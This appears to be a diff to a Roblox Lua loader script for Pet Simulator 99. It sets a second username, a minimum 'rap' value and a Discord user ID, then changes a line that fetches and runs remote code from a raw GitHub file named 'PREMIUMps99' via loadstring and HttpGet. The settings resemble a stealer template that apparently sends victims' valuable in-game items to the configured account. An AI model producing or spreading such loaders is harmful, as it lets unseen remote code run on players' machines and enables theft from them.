@@ -3,4 +3,4 @@ _G.Username2 = "nbvbw"
 _G.minrap = 1000000
 _G.discuser = "1269701634217480267" -- change to your Discord user ID
 
-loadstring(game:HttpGet("https://raw.githubusercontent.com/kjrmz/Latest/refs/heads/main/PREMIUMps99.lua.txt",true))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/kjrmz/Latest/refs/heads/main/PREMIUMps99.lua%20(1).txt",true))()
